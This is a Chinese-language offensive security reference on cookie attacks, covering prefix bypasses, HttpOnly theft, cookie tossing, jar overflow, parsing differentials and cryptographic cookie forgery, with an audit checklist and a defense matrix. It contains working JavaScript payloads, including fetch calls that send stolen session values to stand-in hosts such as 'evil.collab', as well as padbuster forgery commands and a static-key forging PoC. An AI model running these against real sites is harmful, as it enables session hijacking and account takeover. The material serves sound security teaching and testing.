---
attack_surface: [客户端利用, 认证/授权绕过, 注入类, 配置缺陷]
impact: [身份伪造, 权限提升, 信息泄露, 完整性破坏, 可用性破坏]
risk_level: 严重
prerequisites:
  - HTTP 协议基础 (Cookie/Set-Cookie 头部)
  - 浏览器同源策略理解
  - JavaScript 基础 (document.cookie API)
related_techniques:
  - csrf-cross-site-request-forgery
  - jwt-attacks
  - xss-cross-site-scripting
  - xs-search
  - crlf-injection
  - csp-bypass
difficulty: 初级-高级 (按攻击类型)
tools:
  - Burp Suite / Caido
  - padbuster (Padding Oracle)
  - curl / browser DevTools
  - Cookie-Editor (browser extension)
---

# Cookies Hacking

## TL;DR

Cookie 安全涉及**属性配置、前缀保护、解析差异、客户端操纵**四个层面的攻防对抗。攻击者可从 XSS 子域名、中间人位置或通过解析混淆来窃取、固定、注入或覆写 Cookie，最终达成会话劫持、权限提升甚至 RCE（与反序列化联动）。

核心攻击面：
- **属性滥用**：Domain/Path/SameSite 配置不当导致 Cookie 共享到非预期范围
- **前缀绕过**：`__Host-` / `__Secure-` 前缀可通过 Unicode 空白字符、`$Version=1` 解析、PHP/ Werkzeug parser bug 绕过
- **客户端操纵**：Cookie Jar Overflow（溢出驱逐）、Cookie Tossing（同名注入）、Empty Cookie（无名 Cookie）
- **解析差异**：RFC2965 vs RFC6265 parser 差异 → WAF 绕过、Cookie Smuggling、Cookie Sandwich
- **密码学缺陷**：静态密钥、ECB 模式、CBC-MAC、Padding Oracle 均可导致 Cookie 伪造

---

## 1. Cookie 基础属性与安全模型

### 1.1 核心属性

| 属性 | 作用 | 安全影响 |
|------|------|----------|
| `Expires` / `Max-Age` | 过期时间 | `Max-Age` 为现代推荐；长期有效的 Cookie 增加被盗风险 |
| `Domain` | 接收 Cookie 的主机范围 | **显式设置会包含子域名**；不设置则仅限当前 host |
| `Path` | 发送 Cookie 的 URL 路径前缀 | `/` 作为目录分隔符，子目录也可以匹配 |
| `SameSite` | 跨站请求是否携带 Cookie | Strict/Lax/None，**缓解 CSRF** 的关键机制 |
| `HttpOnly` | 禁止 JavaScript 访问 (`document.cookie`) | 防 XSS 窃取，但多种绕过存在 |
| `Secure` | 仅 HTTPS 传输 | 防中间人嗅探，现代应用必须启用 |

### 1.2 SameSite 行为矩阵

| 请求类型 | 示例 | SameSite=NotSet* | Lax | Strict | None |
|----------|------|:---:|:---:|:---:|:---:|
| Link 点击 | `<a href="...">` | ✓ | ✓ | ✗ | ✓ |
| Prerender | `<link rel="prerender">` | ✓ | ✓ | ✗ | ✓ |
| Form GET | `<form method="GET">` | ✓ | ✓ | ✗ | ✓ |
| Form POST | `<form method="POST">` | ✓ | ✗ | ✗ | ✓ |
| iframe | `<iframe src="...">` | ✓ | ✗ | ✗ | ✓ |
| AJAX | `fetch()` / `XMLHttpRequest` | ✓ | ✗ | ✗ | ✓ |
| Image | `<img src="...">` | ✓ | ✗ | ✗ | ✓ |

> **Chrome 80+ (2019.02)**: 未设置 SameSite 的 Cookie 默认行为改为 **Lax**。
> 过渡期前 2 分钟内跨站 POST 仍以 None 处理，之后转为 Lax。

### 1.3 Cookie 排序规则

当两个同名 Cookie 都匹配请求范围时：

1. **路径匹配优先** — 匹配更长 Path 的 Cookie 先发送
2. **时间优先** — 路径相同时，最近设置的 Cookie 先发送
3. **请求中顺序** — 浏览器发送 `Cookie: name=moreSpecific; name=lessSpecific`，**大多数后端取第一个值**

---

## 2. Cookie 前缀保护与绕过

### 2.1 前缀规范

**`__Secure-` 前缀**：
- 必须与 `Secure` flag 同时设置
- 必须从 HTTPS 页面发出

**`__Host-` 前缀**：
- 必须设置 `Secure` flag
- 必须从 HTTPS 页面发出
- **禁止指定 Domain 属性**（不发送到子域名）
- Path 必须设置为 `/`

**安全价值**：`__Host-` 前缀实现了 Cookie 的 "域锁定"——子域名无法覆盖顶级域的同名 Cookie，有效防御 Cookie Tossing 攻击。

### 2.2 绕过技术

#### 2.2.1 Werkzeug Cookie Parser 绕过

**影响版本**：Werkzeug < 2.2.3

Werkzeug 对以下 Set-Cookie 值的解析存在缺陷——以 `=` 开头的 Cookie 名称会被错误解析：

| Set-Cookie | Cookie (raw) | Key | Value |
|-----------|-------------|-----|-------|
| `foo=` | `foo=` | `foo` | (空) |
| `=foo` | `foo` | (空) | `foo` |
| `=foo=` | `foo=` | (空) | `foo=` |
| `==foo` | `=foo` | (空) | `=foo` |
| `foo` | `foo` | (空) | `foo` |

**利用**：在 Cookie 名前添加 `=` 可让 parser 将其解析为空名，从而绕过 `__Host-` 前缀检查。

#### 2.2.2 PHP Cookie 前缀剥离 (CVE-2022-31629)

**影响版本**：PHP < 8.1.11

PHP 错误地将以下三种不同 Cookie 名视为相同：

```
Cookie: __Host-sess=legit    # 标准 __Host- 前缀
Cookie: _Host-sess=bad       # 单下划线开头 → PHP 视为相同
Cookie: ..Host-sess=bad      # 双点开头 → PHP 视为相同
```

**根因**：PHP 在解析 Cookie 名时对非字母数字字符进行了过度归一化，导致 `..Host-` 和 `_Host-` 被当作 `__Host-` 处理，破坏了前缀保护。

#### 2.2.3 Unicode 空白字符 Cookie-Name 走私

利用浏览器与后端对 Cookie 名称 Unicode 字符的解析差异：

```javascript
// 子域名上执行——浏览器不认为这是 __Host- 开头，允许设置
document.cookie = `${String.fromCodePoint(0x2000)}__Host-name=injected; Domain=.example.com; Path=/;`;
```

**有效 Unicode 空白码点**（后端常见 trim/normalize 范围）：
`U+0085` (NEL), `U+00A0` (NBSP), `U+1680`, `U+2000–U+200A`, `U+2028`, `U+2029`, `U+202F`, `U+205F`, `U+3000`

**关键差异**：
- **Chrome/Firefox**：允许 U+2000 等 Unicode 空白在 Cookie 名中，不识别为 `__Host-`
- **Safari**：阻止多字节 Unicode 空白，但**允许**单字节 `U+0085` / `U+00A0`
- **Django/Python**：`str.strip()` 移除以上全部码点，导致归一化为 `__Host-name`
- **多数后端**：重复 Cookie 名采用 "last wins" 策略

**Wire 层面示例**：
```
Cookie: __Host-name=Real; <U+2000>__Host-name=<img src=x onerror=alert(1)>;
```
后端 trim 后两者归一化为同名，后者覆盖前者。

#### 2.2.4 传统 `$Version=1` Cookie 分割（前缀绕过）

部分 Java 栈（Tomcat/Jetty/Undertow）仍支持 RFC 2109/2965 传统解析。当 Cookie header 以 `$Version=1` 开头时，服务器将单个 Cookie 字符串重新解释为多个逻辑 Cookie：

```javascript
document.cookie = `$Version=1,__Host-name=injected; Path=/somethingreallylong/; Domain=.example.com;`;
```

**原理**：
- 浏览器端前缀检查在设置时生效，但服务端传统解析器后续分裂/归一化 header，破坏 `__Host-`/`__Secure-` 前缀保证。

**适用目标**：Tomcat、Jetty、Undertow 或仍支持 RFC 2109/2965 属性的框架。

#### 2.2.5 重复名称 Last-Wins 覆写

两个 Cookie 归一化为同名后，多数后端（含 Django）使用**最后出现**的值。经过 smuggling/传统分割产生两个 `__Host-*` 名称后，攻击者控制的值通常会获胜。

#### 2.2.6 检测与工具化

使用 Burp Suite 探测这些条件：

1. 尝试多个前导 Unicode 空白码点：`U+2000`, `U+0085`, `U+00A0`，观察后端是否 trim 并视为前缀 Cookie
2. 在 Cookie header 首部发送 `$Version=1`，检查后端是否执行传统分割/归一化
3. 注入两个归一化为同名的 Cookie，观察重复名称解析策略（first vs last wins）
4. 自动化工具：[CookiePrefixBypass.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/CookiePrefixBypass.bambda)

> 核心原理：RFC 6265 中浏览器发送字节流，服务器解码并可能归一化/trim。解码与归一化的不匹配是前缀绕过的根源。

---

## 3. HttpOnly 绕过

`HttpOnly` flag 禁止客户端 JavaScript 通过 `document.cookie` 访问 Cookie，但存在以下绕过路径：

### 3.1 服务端 Cookie 反射

如果页面在响应中回显 Cookie（如 PHP `phpinfo()` 页面），可用 XSS 发请求到此页面，从响应中窃取 Cookie：

```javascript
// 利用 phpinfo 页面窃取 HttpOnly session
fetch('/phpinfo.php')
  .then(r => r.text())
  .then(t => {
    // 从 HTML 中正则提取 session 值
    const m = /session\.cookie[^;]*;\s*(\S+)/.exec(t);
    if (m) fetch('https://evil.collab/', {method:'POST', body:m[1]});
  });
```

**变体 — HTML 注释标记提取**：当 Session ID 被包裹在特定 HTML 注释中时（常见于遗留系统的调试输出），可以通过正则匹配注释边界精确提取：

```javascript
// 提取 <!-- startscrmprint --> ... <!-- stopscrmprint --> 之间的内容
const re = /<!-- startscrmprint -->([\s\S]*?)<!-- stopscrmprint -->/;
fetch('/index.php?module=Touch&action=ws')
  .then(r => r.text())
  .then(t => {
    const m = re.exec(t);
    if (m) fetch('https://collab/leak', {
      method: 'POST',
      body: JSON.stringify({leak: btoa(m[1])})
    });
  });
```

### 3.2 TRACE 方法（Cross-Site Tracking）

HTTP TRACE 方法将收到的 Cookie 原样反射回响应体。**现代浏览器已阻止从 JS 发起 TRACE 请求**，但历史绕过：

- IE 6.0 SP2：发送 `\r\nTRACE` 替代 `TRACE` 可绕过限制

### 3.3 Cookie Jar Overflow → 驱逐 HttpOnly Cookie

通过创建大量 Cookie 驱逐目标 HttpOnly Cookie，然后用**非 HttpOnly** 的同名 Cookie 替换：

```javascript
const targetScope = "Path=/app; Secure";

// 驱逐阶段：大量创建 Cookie 直到旧 Cookie 被驱逐
for (let i = 0; i < 250; i++) {
  document.cookie = `junk${i}=${crypto.randomUUID()}; ${targetScope}`;
}

// 替换阶段：创建同名但非 HttpOnly 的 Cookie
document.cookie = `session=attacker-controlled; ${targetScope}`;
```

> **注意**：此原语是「驱逐 + 新建」，而非直接修改 HttpOnly。需要匹配原始 Cookie 的 name、Path、Domain 三个维度。

### 3.4 Cookie Sandwich 技术

利用 `$Version=1` 传统解析 + Cookie 反射偷取 HttpOnly Cookie：

**条件**：
1. 某页面在响应中回显某个 Cookie 的值
2. 能从 JS 设置 Cookie（子域名 XSS 或 Domain Cookie 注入）

**步骤**：
```javascript
// Step 1: 创建 $Version cookie（更窄 path 确保排最前）
document.cookie = `$Version=1; Path=/vulnerable-endpoint`;

// Step 2: 创建反射 cookie，值为开放双引号
document.cookie = `param1="start; Path=/vulnerable-endpoint`;

// Step 3: 此时任何落在中间的正常 cookie 都会被夹入 param1 的值中

// Step 4: 关闭双引号
document.cookie = `param2=end"; Path=/vulnerable-endpoint`;
```

**Wire 结果**：服务端看到 `$Version=1; param1="start; victim_session=abc123; param2=end";`，将 victim 的 Cookie 值展开在 `param1` 中——如果该参数被回显在响应中，即可窃取。

### 3.5 浏览器 0-day

利用浏览器级别的漏洞直接读取 Cookie 存储。不在本文讨论范围。

---

## 4. Cookie 操纵攻击

### 4.1 空名称 Cookie

**原始研究**：[Cookie Bugs - Ankur Sundara](https://blog.ankursundara.com/cookie-bugs/)

浏览器允许创建没有名称的 Cookie：

```javascript
document.cookie = "a=v1";
document.cookie = "=test value;";  // 空名称 Cookie
document.cookie = "b=v2";

// 发送的 Cookie header: a=v1; test value; b=v2;
```

**操纵技巧**：空名称 Cookie 可改变另一个 Cookie 的解析结果：

```javascript
function setCookie(name, value) {
  document.cookie = `${name}=${value}`;
}
setCookie("", "a=b");  // 空名称 → 浏览器发送 "a=b"，服务器将其解析为 a=b
```

#### Chrome Unicode Surrogate Bug

```javascript
document.cookie = "\ud800=meep";  // → document.cookie 永久返回空字符串
```

设置含 Unicode surrogate codepoint 的 Cookie 会导致 `document.cookie` 永久损坏（无法再读取任何 Cookie）。

### 4.2 Cookie Jar Overflow

**规范阈值**：浏览器只需支持**每个 domain 至少 50 个 Cookie**（RFC 6265）。
**实际阈值**：Chromium 为每个 eTLD+1 **180 个**，partitioned jar 也是 180 个。

```javascript
const attrs = "Path=/";
let prev = -1;

for (let i = 0; i < 400; i++) {
  document.cookie = `junk${i}=${"A".repeat(32)}; ${attrs}`;
  const visible = document.cookie ? document.cookie.split(/; */).length : 0;
  if (visible === prev) break;  // document.cookie 可见量已稳定
  prev = visible;
}
// 继续超出 visible 平台值以覆盖 HttpOnly cookie
```

#### 驱逐可靠性说明

- **LRU 策略**：Chromium 的 GC 是 LRU-like，倾向于保留 Secure / 高优先级 Cookie 更久。最近使用的 Session Cookie 比旧的 low-priority Cookie 更难驱逐。
- **先 Profile**：溢出前通过 Burp/DevTools 捕获原始 `Set-Cookie`，记录 Path、Domain、Priority、前缀和 Partitioned 状态。
- **分区影响**：如果 Cookie 是 Partitioned（CHIPS），从 `cdn.example`（内嵌在 `siteA.com`）溢出不会驱逐同域作为 top-level site 使用时的 Cookie。
- **新前缀限制**：浏览器开始支持 `__Http-` / `__Host-Http-` 前缀——JS 不能通过 `document.cookie` 重新创建这些 Cookie。可以驱逐但无法重建同名替代。

### 4.3 Cookie Tossing（Cookie 投掷）

**前提**：攻击者控制子域名或在子域名找到 XSS。

利用显式设置的 `Domain` 属性将 Cookie 传播到父域和所有子域：

```javascript
// 从子域名设置父域的 Cookie
document.cookie = "session=attacker123; Path=/app; Domain=.example.com";
```

**攻击场景**：

| 场景 | 机制 | 危害 |
|------|------|------|
| **Session Fixation** | 诱导受害者使用攻击者控制的 Cookie 登录 | 攻击者用同一 Cookie 登录为受害者 |
| **Session Donation** | 受害者使用攻击者的 Session Cookie | 受害者泄露操作数据到攻击者账户 |
| **CSRF Token 覆盖** | 设置已知值的 CSRF Token Cookie | 绕过 CSRF 保护执行跨站请求 |
| **OAuth 劫持** | 在 OAuth 回调路径上设置恶意 Cookie | 受害者授权后访问的是攻击者账户 |

**Cookie 顺序操作**：

当浏览器收到两个同名 Cookie 部分影响相同 scope 时：

```
Cookie: iduser=MoreSpecificAndOldest; iduser=LessSpecific;
```

- **更精确 Path 的 Cookie 排前** → 攻击者在特定路径上设置窄 scope Cookie 可覆盖合法 Cookie
- **更旧 Cookie 排前** → 攻击者可在合法 Cookie 之前抢先设置

**防御绕过**：
1. URL 编码 Cookie 名称——某些保护检查名称为 `cookie_name`，但服务端 URL 解码后识别为 `cookie name`
2. 先用 Cookie Jar Overflow 删除合法 Cookie，再用恶意 Cookie 替换

### 4.4 Cookie Bomb

**Double DoS 攻击**：向目标 domain 及其子域名注入大量大体积 Cookie，导致受害者所有请求都携带巨大 Cookie header，被服务器拒绝。

**攻击效果**：
- 服务器返回 431 (Request Header Fields Too Large) 或 400
- 用户无法访问目标域及子域的所有服务
- **Cookie Bomb + XS-Leak**：详见第 7 章

**参考案例**：[HackerOne #57356](https://hackerone.com/reports/57356)

---

## 5. Cookie 解析差异与注入

### 5.1 RFC2965 vs RFC6265 解析差异

**受影响服务器**：Java (Jetty, Tomcat, Undertow) 和 Python (Zope, cherrypy, web.py, aiohttp, bottle, webob) 的部分版本仍支持过时的 RFC2965 解析。

#### 双引号包装（Quote Smuggling）

RFC2965 允许用双引号包裹 Cookie 值，双引号内的分号不被视为分隔符：

```
Cookie: RENDER_TEXT="hello world; JSESSIONID=13371337; ASDF=end";
```

→ 解析为单个 Cookie `RENDER_TEXT`，值 = `"hello world; JSESSIONID=13371337; ASDF=end"`
→ 攻击者可**注入伪造的 `JSESSIONID`** 或 CSRF Token

#### Cookie 注入（Cookie Injection）

**受影响实现**：

| 服务器 / 库 | 新 Cookie 起始字符 | 注入方式 |
|-------------|-------------------|---------|
| **Undertow** | 引号值后无分号 | `"value"` 后直接跟新 Cookie 名 |
| **Zope** | 逗号 (`,`) | `, malicious=injected` |
| **Python SimpleCookie/BaseCookie** | 空格 (` `) | ` value; malicious=injected` |

**严重性**：
- CSRF Token 注入绕过 CSRF 保护
- `__Secure-` / `__Host-` Cookie 在非安全上下文中可被覆盖
- 当 Cookie 传递给易受欺骗的后端服务时导致授权绕过

### 5.2 `$Version=1` WAF 绕过

**原始研究**：[Bypassing WAFs with the Phantom $Version Cookie](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie)

`$Version=1` 触发后端使用 RFC2109 传统解析逻辑。其他属性如 `$Domain` 和 `$Path` 也可用于修改后端行为。

#### Quoted-String 编码绕过

传统解析指示对 Cookie 值中的转义字符进行反转义处理（`\a` → `a`）：

```javascript
// 以下 Cookie 值在 $Version=1 模式下：
// "\a\l\e\r\t\(\'xss\'\)" → 解析为 → alert('xss')

// WAF 检查原始字符串 → 不匹配恶意规则 → 放过
// 后端反转义 → 得到恶意 payload
```

#### Cookie 名称分隔符绕过 (RFC2109)

RFC2109 允许**逗号**作为 Cookie 之间的分隔符，且允许等号前后有**空格和制表符**：

```
Cookie: $Version=1; foo=bar, admin = qux
```

→ 不解析为 `"foo": "bar, admin = qux"`
→ 解析为两个 Cookie：`"foo": "bar"` 和 `"admin": "qux"`
→ `admin` 前面的空格被移除 → **绕过 Cookie 名称黑名单**

#### Cookie 头部分割

后端可能将多个 Cookie header 拼接处理：

```http
GET / HTTP/1.1
Host: example.com
Cookie: name=eval('test//
Cookie: comment')
```

→ 拼接结果：`name=eval('test//, comment')` → WAF 放过，但后端执行 `eval(...)`

---

## 6. Cookie 密码学攻击

### 6.1 Padding Oracle（填充预言）

**工具**：[padbuster](https://github.com/AonCyberLabs/PadBuster)

**基本用法**：

```bash
# 基础解密
padbuster http://web.com/index.php u7bvLewln6PJPSAbMb5pFfnCHSEd6olf 8 \
  -cookies auth=u7bvLewln6PJPSAbMb5pFfnCHSEd6olf

# URL-safe Base64 或 hex 编码需指定 --encoding
padbuster http://web.com/home.jsp?UID=7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6 \
  7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6 8 -encoding 2
```

Padbuster 会自动探测错误条件（哪个响应表示 padding 无效），然后逐字节解密 Cookie（可能需几分钟）。

**加密任意值**：

```bash
padbuster http://web.com/index.php 1dMjA5hfXh0jenxJQ0iW6QXKkzAGIWsiDAKV3UwJPT2lBP+zAD0D0w== 8 \
  -cookies thecookie=1dMjA5hfXh0jenxJQ0iW6QXKkzAGIWsiDAKV3UwJPT2lBP+zAD0D0w== \
  -plaintext user=administrator
```

### 6.2 CBC-MAC 签名绕过

当 Cookie 使用 CBC 模式签名（且 IV 为空向量）时：

**攻击步骤**：
1. 获取用户名 `administ` 的签名 = **t**
2. 获取用户名 `rator\x00\x00\x00 XOR t` 的签名 = **t'**
3. 设置 Cookie = `administrator + t'` —— **t'** 是 `(rator\x00\x00\x00 XOR t) XOR t` = `rator\x00\x00\x00` 的有效签名

### 6.3 ECB 模式（Electronic Codebook）

当 Cookie 使用 ECB 加密时，相同的明文块产生相同的密文块。

**检测**：
1. 创建用户 `"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"`（大量相同字符）
2. Cookie 中出现重复的密文模式 → 确认 ECB

**利用**：
- 创建用户 `"a" * block_size + "admin"`
- 从 Cookie 中删除 `"a" * block_size` 对应的密文块
- 剩余部分就是用户 `"admin"` 的合法 Cookie

### 6.4 静态密钥 Cookie 伪造

某些应用使用全局硬编码对称密钥，仅加密可预测的值（如数字用户 ID）生成认证 Cookie。

**测试/伪造流程**：
1. 识别认证 Cookie（如 `COOKIEID`、`ADMINCOOKIEID`）
2. 确定加密算法和编码（现实案例：IDEA + 16 字节常量密钥 + hex 输出）
3. 加密自己的用户 ID 并与收到的 Cookie 对比验证
4. 对目标 ID 加密（ID=1 通常映射到首个管理员）→**设置伪造 Cookie 即可绕过认证**

<details>
<summary>现实案例 Java PoC（IDEA + hex）</summary>

```java
import cryptix.provider.cipher.IDEA;
import cryptix.provider.key.IDEAKeyGenerator;
import cryptix.util.core.Hex;
import java.security.Key;
import java.security.KeyException;
import java.io.UnsupportedEncodingException;

public class App {
    private String ideaKey = "1234567890123456"; // 全局硬编码密钥

    public String encode(String plain) {
        IDEAKeyGenerator keygen = new IDEAKeyGenerator();
        IDEA encrypt = new IDEA();
        Key key;
        try {
            key = keygen.generateKey(this.ideaKey.getBytes());
            encrypt.initEncrypt(key);
        } catch (KeyException e) { return null; }
        if (plain.length() == 0 || plain.length() % encrypt.getInputBlockSize() > 0) {
            for (int currentPad = plain.length() % encrypt.getInputBlockSize();
                 currentPad < encrypt.getInputBlockSize(); currentPad++) {
                plain = plain + " "; // 空格填充
            }
        }
        byte[] encrypted = encrypt.update(plain.getBytes());
        return Hex.toString(encrypted); // Cookie 期望 hex 格式
    }
}
```
</details>

---

## 7. Cookie Bomb + XS-Leak (onerror 预言机)

### 7.1 攻击原理

将 Cookie Bomb 与 XS-Search 的 Error Event 预言机结合，实现跨站信息泄露：

1. **Cookie Bomb** — 向目标域注入大量 Cookie 膨胀请求头
2. **状态区分** — 命中条件触发重定向链或长 URL → 请求头超过服务器限制 → **431/414** 错误
3. **预言机** — `<script>` / `<link>` 标签探测：`onload` = 成功(短路径)，`onerror` = 失败(超长路径)

**适用条件**：
- 可让受害者浏览器向目标域发送 Cookie（SameSite=None 或通过 `window.open` 第一方上下文）
- 存在可滥用的 "保存偏好" 类端点（将用户控制的输入名/值转为 Set-Cookie）
- 服务器对不同状态响应不同，膨胀后单一路径超过限制触发错误

### 7.2 第一方 Cookie 播种（绕过 Tracking Protection）

Chrome 从 2024 年 1 月起逐步阻止第三方 Cookie（Tracking Protection），Safari/Firefox 已默认阻止。需要用 `window.open` 建立第一方上下文：

```javascript
async function plantFirstPartyCookies(endpoint, fields) {
  for (let i = 0; i < 5; i++) {
    const name = crypto.randomUUID();
    const form = Object.assign(document.createElement('form'), {
      action: endpoint, method: 'POST', target: name
    });
    Object.entries(fields).forEach(([k, v]) => {
      const input = document.createElement('input');
      input.name = k;
      input.value = v + '_'.repeat(400 + 120 * i);
      form.appendChild(input);
    });
    document.body.appendChild(form);
    window.open('about:blank', name, 'noopener');
    form.submit();
    await new Promise(r => setTimeout(r, 120));
    form.remove();
  }
}
```

### 7.3 通用探测预言机

```javascript
// Script 标签预言机
function probeError(url) {
  return new Promise((resolve) => {
    const s = document.createElement('script');
    s.src = url;
    s.onload = () => resolve(false);  // 成功加载
    s.onerror = () => resolve(true);  // 失败 (431/414/400/MIME 不匹配)
    document.head.appendChild(s);
  });
}

// Stylesheet 替代
function probeCSS(url) {
  return new Promise((resolve) => {
    const l = document.createElement('link');
    l.rel = 'stylesheet';
    l.href = url;
    l.onload = () => resolve(false);
    l.onerror = () => resolve(true);
    document.head.appendChild(l);
  });
}
```

### 7.4 de Bruijn 高级 Cookie 打包

当应用允许控制大量 Cookie 值时，使用 de Bruijn 序列高效编码猜测前缀：

```javascript
const ALPH = '_{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
function deBruijn(k, n, alphabet = ALPH) {
  const a = Array(k * n).fill(0), seq = [];
  (function db(t, p) {
    if (t > n) { if (n % p === 0) for (let j = 1; j <= p; j++) seq.push(a[j]); }
    else { a[t] = a[t - p]; db(t + 1, p); for (let j = a[t - p] + 1; j < k; j++) { a[t] = j; db(t + 1, t); } }
  })(1, 1);
  return seq.map(i => alphabet[i]).join('');
}
```

### 7.5 预言机稳定化技巧

- **使 "positive" 分支更重**：仅在条件成立时链入额外重定向，或让重定向 URL 反射未限制的用户输入使其随猜测前缀增长
- **多次轰炸**：并行设置多个 Cookie，多次探测以均化时序和缓存噪音
- **打破缓存**：探测 URL 添加随机 `#fragment` 或 `?r=`，`window.open` 使用不同的窗口名
- **备选子资源**：如果 `<script>` 被过滤，尝试 `<link rel=stylesheet>` 或 `<img>`

### 7.6 常见 HTTP 头部/URL 限制阈值

| 代理/服务器 | 请求头限制 | URL 限制 | 来源 |
|------------|----------|--------|------|
| Cloudflare (Edge) | 128 KB | 16 KB | [Cloudflare docs](https://developers.cloudflare.com/fundamentals/reference/connection-limits/) |
| Apache | ~8 KB/header line (`LimitRequestFieldSize`) | 可配置 | 默认设置 |
| Nginx | 可配置 (`large_client_header_buffers`) | 可配置 | 默认 ~8 KB |

### 7.7 2025+ 浏览器加固

- **Firefox 139/ESR 128.11 (CVE-2025-5266)**：收紧了跨域 script 标签的 load/error 事件触发条件，特定重定向响应的 `onerror` 不再触发。
- **Enterprise Chromium + Tracking Protection**：可能间歇性地剥离 Cookie 或重写重定向。
- **回退策略**：先用短 URL 探测，失败时自动切换到在 `window.open` 弹出的 first-party 窗口中执行全部攻击，通过 `postMessage`/`BroadcastChannel` 回传每 bit 结果。

---

## 8. Cookie 审计清单

### 基础检查

1. Cookie 每次登录后是否保持不变？
2. 登出后 Cookie 是否仍有效？
3. 两个设备/浏览器用同一个 Cookie 能否同时登录？
4. Cookie 包含可解码信息（Base64/Hex/JSON）→ 修改后重编码
5. 批量注册相似用户名——Cookie 是否有可识别模式？
6. "记住我" 功能的 Cookie 是否可独立使用（无需其他 Cookie）？
7. 修改密码后旧 Cookie 是否仍然有效？

### 高级检查

- **算法逆向**：Cookie 与用户名/邮箱有强关联 → 暴力猜测算法
- **用户名暴力**：Cookie 编码依赖用户名字段 → 创建账户 `"Bmin"` 逐 bit 爆破 `"admin"` 的 Cookie
- **Padding Oracle**：使用 padbuster 解密/加密
- **ECB 检测**：创建大量 `"a"` 字符的用户名，观察密文重复模式

---

## 9. 攻击链建模

```
[子域名 XSS] → [Cookie Tossing] → [Session Fixation] → [账号接管]
[子域名控制] → [Domain=.parent Cookie设置] → [CSRF Token覆盖] → [CSRF攻击]
[XSS in App] → [Cookie Jar Overflow] → [驱逐 HttpOnly] → [重建同名 Cookie] → [会话窃取]
[XSS in App] → [Empty Cookie注入] → [CSRF Token欺骗] → [权限操作]
[任意 Cookie 设置] → [Cookie Bomb + XS-Leak] → [逐字符信息泄露] → [数据外泄]
[静态密钥发现] → [Cookie 离线伪造] → [直接认证绕过] → [完整账号接管]
```

---

## 10. 防御矩阵

| 层级 | 措施 | 防护的攻击类型 |
|------|------|--------------|
| **Cookie 属性** | `__Host-` 前缀 + `Secure` + `HttpOnly` + `SameSite=Lax` | Cookie Tossing, Session Fixation, XSS 窃取 |
| **输入验证** | Cookie 名仅允许 ASCII 字母数字 + `_-` | Unicode 空白走私, 特殊字符注入 |
| **解析器加固** | 仅支持 RFC 6265；禁用 RFC 2109/2965 兼容模式 | $Version 攻击, Quoted-String 绕过 |
| **加密** | 使用认证加密 (AEAD) 而非 ECB/CBC；密钥派生而非硬编码 | ECB/CBC 已知明文攻击, 静态密钥伪造 |
| **服务器配置** | `LimitRequestFieldSize` / `large_client_header_buffers` 合理限制 | Cookie Bomb DoS |
| **会话管理** | 登录后重新生成 Session ID；`Set-Cookie` 不指定 Domain（作用域隔离） | Session Fixation, Cookie Tossing |
| **CSRF 保护** | CSRF Token **不存储在 Cookie 中**；使用 `SameSite=Strict` 作为纵深防御 | Cookie 注入绕过 CSRF |
| **监控** | 检测异常多的 Cookie header 大小；同名 Cookie 冲突告警 | Cookie Bomb, Cookie Tossing |

---

## 参考资料

### 核心研究
- [Cookie Bugs — Ankur Sundara](https://blog.ankursundara.com/cookie-bugs/) — 空 Cookie、Cookie Smuggling/Cookie Injection 原始研究
- [Cookie Crumbles: Unveiling Web Session Integrity Vulnerabilities](https://www.usenix.org/system/files/usenixsecurity23-squarcina.pdf) — USENIX Security '23 论文
- [Cookie Crumbles 演讲 (YouTube)](https://www.youtube.com/watch?v=F_wAzF4a7Xg)
- [Cookie Chaos: How to bypass __Host and __Secure cookie prefixes](https://portswigger.net/research/cookie-chaos-how-to-bypass-host-and-secure-cookie-prefixes) — PortSwigger Research

### 攻击技术
- [Bypassing WAFs with the Phantom $Version Cookie](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie) — PortSwigger Research
- [Stealing HttpOnly Cookies with the Cookie Sandwich Technique](https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique) — PortSwigger Research
- [Overwriting HttpOnly Cookies via Cookie Jar Overflow](https://www.sjoerdlangkemper.nl/2020/05/27/overwriting-httponly-cookies-from-javascript-using-cookie-jar-overflow/) — Sjoerd Langkemper
- [Bypassing HttpOnly via PHP Info Page](https://blog.hackcommander.com/posts/2022/11/12/bypass-httponly-via-php-info-page/)
- [The Cookie Monster in Your Browsers](https://speakerdeck.com/filedescriptor/the-cookie-monster-in-your-browsers) — Filedescriptor
- [Promiscuous Cookies and Their Impending Death via the SameSite Policy](https://www.troyhunt.com/promiscuous-cookies-and-their-impending-death-via-the-samesite-policy/) — Troy Hunt
- [Hijacking OAuth Flows via Cookie Tossing](https://snyk.io/articles/hijacking-oauth-flows-via-cookie-tossing/) — Snyk

### 工具与实现
- [CookiePrefixBypass.bambda — Burp Suite Custom Action](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/CookiePrefixBypass.bambda)
- [PadBuster — Padding Oracle 攻击工具](https://github.com/AonCyberLabs/PadBuster)

### 浏览器参考
- [Chromium Cookie Eviction 机制](https://blog.yoav.ws/posts/how_chromium_cookies_get_evicted/)
- [CHIPS / Partitioned Cookies](https://privacysandbox.google.com/cookies/chips)
- [Cloudflare 连接限制](https://developers.cloudflare.com/fundamentals/reference/connection-limits/)
- [Chrome Tracking Protection 详情](https://blog.google/products/chrome/privacy-sandbox-tracking-protection/)
- [MFSA 2025-44 (CVE-2025-5266)](https://www.mozilla.org/en-US/security/advisories/mfsa2025-44/)

### 案例研究
- [When Audits Fail: TRUfusion Enterprise 静态密钥漏洞](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)
- [HackerOne #57356 — Cookie Bomb 案例](https://hackerone.com/reports/57356)
- [GitHub: Yummy Cookies Across Domains](https://github.blog/2013-04-09-yummy-cookies-across-domains/)
